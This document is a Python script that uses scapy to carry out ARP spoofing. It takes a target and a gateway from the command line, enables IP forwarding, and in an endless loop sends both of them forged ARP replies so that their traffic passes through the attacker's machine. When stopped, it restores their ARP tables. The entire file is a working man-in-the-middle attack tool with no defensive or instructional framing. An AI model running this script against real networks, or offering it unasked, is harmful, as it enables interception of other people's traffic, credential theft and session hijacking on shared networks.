#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target to ARP Spoof")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway of target")
    options = parser.parse_args()
    if not options.target:
        # handle error
        parser.error("[-] Please specify a target to spoof, use --help for more info")
    if not options.gateway:
        # handle error
        parser.error("[-] Please specify a gateway, use --help for more info")
    return options

def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    mac_address = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# get these from commandline args

options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    # start ip forwarding for packets
    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
    f.write("1")
    f.close()
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Sending ARP Spoof to " + target_ip + " and " + gateway_ip + " [Sent: " + str(sent_packets_count) + "]"),
        time.sleep(2)
except KeyboardInterrupt:
    # stop ip forwarding for packets
    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
    f.write("0")
    f.close()
    print("\n[+] Detected Ctrl+C -- Resetting ARP Tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
